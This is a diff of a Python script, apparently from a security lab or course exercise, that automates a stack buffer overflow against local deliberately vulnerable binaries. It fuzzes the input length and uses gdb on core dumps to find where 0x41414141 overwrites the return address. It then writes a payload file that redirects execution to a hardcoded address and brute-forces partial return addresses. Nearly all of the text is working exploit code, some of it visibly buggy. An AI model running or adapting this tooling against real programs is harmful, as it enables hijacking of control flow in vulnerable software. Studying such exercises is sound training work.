@@ -39,29 +39,36 @@ def findMinBadLen(seedInput, fuzzFile, fuzzedProgram, mutations):
 
     inp = seedInput
     minBadLen = sys.maxsize
+    lenToReachReturnAddr = sys.maxsize
     inp = ""
+    broken=0
     for i in range(mutations):
         # inp = mutate(inp)
         inp = inp + 'A'
-        currLen = len(repr(inp))
+        currLen = len(inp)
         # create files and keep feeding them into the system
         file = open(fuzzFile, 'wb')
         file.write(currLen.to_bytes(4, 'big'))
-        file.write(bytes(repr(inp), 'utf-8'))
+        file.write(bytes(inp, 'utf-8'))
         file.close()
         try:
-            output = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, check=True)
+            output = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, check=True, errors='ignore')
         except subprocess.CalledProcessError:
             print(output.stdout)
             print(output.stderr)
-            if minBadLen > currLen:
+            if broken==0:
                 minBadLen = currLen
+                broken=1
             print(i, f"crushed the system with inp={repr(inp)} and len=", currLen)
+            siaddr=si_addr()    
+            if siaddr== '0x41414141':
+                lenToReachReturnAddr=currLen-4
+                break
         print(output.stdout)
         print(output.stderr)
 
     print(f"The minimum bad len input that was found is {minBadLen}")
-    return minBadLen
+    return lenToReachReturnAddr
 
 
 def test():
@@ -69,10 +76,10 @@ def test():
     print(str)
 
 
-def attackSystem(minBadLen, fuzzedProgram, fuzzFile):
+def attackSystem(lenToReachReturnAddr, fuzzedProgram, fuzzFile, attackAddress):
     file = open(fuzzFile, 'wb')
-    attackLen = (minBadLen + 7).to_bytes(4, 'big')
-    attackString = b'A' * (minBadLen + 3) + b'\x36\x92\x04\x08'
+    attackLen = (lenToReachReturnAddr + 4).to_bytes(4, 'big')
+    attackString = b'A' * lenToReachReturnAddr + attackAddress
     file.write(attackLen)
     file.write(attackString)
     file.close()
@@ -86,16 +93,15 @@ def attackSystem(minBadLen, fuzzedProgram, fuzzFile):
     return attackLen
 
 
-def breakSystemBeforeReturn(minBadLen, fuzzedProgram, fuzzFile):
-    # +3 to overwrite the base address pointer
+def breakSystemBeforeReturn(lenToReachReturnAddr, fuzzedProgram, fuzzFile):
     # +4 to overwrite the return address
-    inp = b'A' * (minBadLen + 3+4)
+    inp = b'A' * (lenToReachReturnAddr + 4)
     i=0
     gb=10_000_000_000
     siaddr='0x41414141'
     while i<gb and siaddr== '0x41414141':
         inp = inp + i*b'A'
-        currLen = minBadLen+3+4+i
+        currLen = lenToReachReturnAddr+4+i
         # create files and keep feeding them into the system
         file = open(fuzzFile, 'wb')
         file.write(currLen.to_bytes(4, 'big'))
@@ -134,7 +140,7 @@ def convertAddressToString(addr):
 
 
 # partial address must contain full bytes
-def attackWithPartialAddress(minBadLen, partialAddress, fuzzedProgram, fuzzFile):
+def attackWithPartialAddress(lenToReachReturnAddr, partialAddress, fuzzedProgram, fuzzFile):
 
     # build the address
     partialAddressLen = len(str(partialAddress))
@@ -145,8 +151,8 @@ def attackWithPartialAddress(minBadLen, partialAddress, fuzzedProgram, fuzzFile)
         file = open(fuzzFile, 'wb')
         attackAddress = i.to_bytes(unknownBytesNr, 'big') + partialAddress.encode(encoding="latin")
         # build the attack
-        attackLen = (minBadLen + 7).to_bytes(4, 'big')
-        attackString = b'A' * (minBadLen + 3)
+        attackLen = (lenToReachReturnAddr + 4).to_bytes(4, 'big')
+        attackString = b'A' * lenToReachReturnAddr
         file.write(attackLen)
         file.write(attackString)
         file.write(attackAddress)
@@ -176,10 +182,9 @@ def si_addr():
     output = subprocess.run(["gdb", fuzzedProgram, "core"],input="p $_siginfo\n\quit\n", capture_output=True, text=True, shell=False, check=True)
     list_of_words = output.stdout.split()
     #print(output.stdout)
-    try:
-        si_addr = list_of_words[list_of_words.index("fault.") + 2].replace(",","")
-    except ValueError:
-        si_addr = list_of_words[list_of_words.index("instruction.") + 2].replace(",","")
+    
+    si_addr = list_of_words[list_of_words.index("signal") + 5].replace(",","")
+    
     return si_addr
 
 
@@ -198,13 +203,14 @@ if __name__ == '__main__':
     #Set variables for the fuzzed program
     seedInput = "abcdefghijklmno"
     fuzzFile = 'attack.bin'
-    fuzzedProgram = "./vlad-iulian-pop-fuzzing/simple-vulnerable-buffer-overflow-from-file"
-    mutations = 40
+    fuzzedProgram = "./new-programs/a3"
+    attackAddress=b'\x72\x92\x04\x08'
+    mutations = 100
     sys.stdout = open('log.txt', 'w')
-    minBadLen = findMinBadLen(seedInput, fuzzFile, fuzzedProgram, mutations)
-    attackLen = int.from_bytes(attackSystem(minBadLen,fuzzedProgram,fuzzFile), "big")
-    #attackWithPartialAddress(minBadLen,'\x92\x04\x08', fuzzedProgram,fuzzFile)
-    breakSystemBeforeReturn(minBadLen, fuzzedProgram, fuzzFile)
+    lenToReachReturnAddr = findMinBadLen(seedInput, fuzzFile, fuzzedProgram, mutations)
+    attackLen = int.from_bytes(attackSystem(lenToReachReturnAddr,fuzzedProgram,fuzzFile,attackAddress), "big")
+    #attackWithPartialAddress(lenToReachReturnAddr,'\x92\x04\x08', fuzzedProgram,fuzzFile)
+    #breakSystemBeforeReturn(lenToReachReturnAddr, fuzzedProgram, fuzzFile)
     sys.stdout.close()
 
 
